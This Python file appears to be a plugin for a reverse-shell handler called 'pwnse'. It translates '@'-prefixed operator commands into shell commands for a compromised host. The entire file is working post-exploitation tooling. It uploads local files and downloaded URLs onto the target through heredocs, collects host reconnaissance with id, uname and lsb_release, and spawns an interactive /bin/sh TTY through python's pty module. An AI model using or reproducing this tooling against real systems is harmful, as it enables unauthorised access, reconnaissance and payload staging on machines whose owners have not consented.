#!/usr/bin/env python3


def transform(data, pse):
    def escape(data):
        return data.replace(b'$', b'\\$').replace(b'`',b'\\`')
    def upload(parts, pse):
        if len(parts) < 2:
            print('You must specify a file to upload')
            return b''
        content = None
        with open(parts[1], 'rb') as f:
            content = f.read()
        print('Uploading {}...'.format(parts[1]))
        return b'cat <<EOS > ' + parts[1] + b'\n' + escape(content) + b'\nEOS\n'
    def download(parts, pse):
        if len(parts) < 3:
            print('You must specify a url to download and a filename to save to')
            return b''
        import requests
        r = requests.get(parts[1])
        print('Downloading {} to {}...'.format(parts[1], parts[2]))
        return b'cat <<EOS > ' + parts[2] + b'\n' + escape(r.content) + b'\nEOS\n'        
    def upgrade(parts, pse):
        print('python -c \'import pty;pty.spawn("/bin/sh")\'')
        return b'python -c \'import pty;pty.spawn("/bin/sh")\'\n'
    def info(parts, pse):
        return b'cat <<EOF\npwd\t$(pwd)\nid\t$(id)\nuname\t$(uname -a)\ndist\t$(lsb_release -a)\nEOF\n'
    def chelp(parts, pse):
        print('pwnse help')
        print('@help\t\t\t\tGet help')
        print('@ping\t\t\t\tPing, pong')
        print('@i(nfo)\t\t\t\tGet info on remote host')
        print('@u(pload) [file]\t\tUpload a file')
        print('@d(ownload) [url] [name]\tDownload a url to specified file')
        print('@up(grade)\t\t\tUpgrade to a tty with python')
        return b''

    cmds = {}
    cmds[b'ping'] = lambda parts, pse: b'echo pong\n'
    cmds[b'i'] = info
    cmds[b'info'] = info
    cmds[b'u'] = upload
    cmds[b'upload'] = upload
    cmds[b'd'] = download
    cmds[b'download'] = download
    cmds[b'up'] = upgrade
    cmds[b'upgrade'] = upgrade
    cmds[b'?'] = chelp
    cmds[b'help'] = chelp

    if data.startswith(b'@'):
        parts = data[1:-1].split(b' ')
        if parts[0] in cmds:
            r = b''
            try:
                r = cmds[parts[0]](parts, pse)
            except:
                import traceback
                traceback.print_exc()
            return r
        elif parts[0].startswith(b'@'):
            return b' '.join(parts) + b'\n'
        else:
            print('Unknown command @{}'.format(str(parts[0], 'utf8')))
            return b''
    return data
